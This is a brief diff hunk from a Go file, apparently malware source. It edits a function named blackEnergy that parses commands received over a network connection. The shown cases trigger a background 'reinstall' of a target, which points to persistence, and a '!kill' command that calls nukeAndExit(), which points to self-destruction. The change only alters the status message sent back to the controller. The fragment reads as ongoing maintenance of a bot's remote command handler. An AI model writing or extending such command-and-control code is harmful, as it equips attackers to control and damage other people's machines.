@@ -196,7 +196,7 @@ func blackEnergy(conn net.Conn, command string) error {
 			return nil
 		}
 		go reinstall(fields[1])
-		conn.Write([]byte(msgPersistStart))
+		conn.Write([]byte(fmt.Sprintf(protoInfoFmt, "Reinstall initiated: "+fields[1])))
 	case "!kill":
 		conn.Write([]byte(msgKillAck))
 		nukeAndExit()
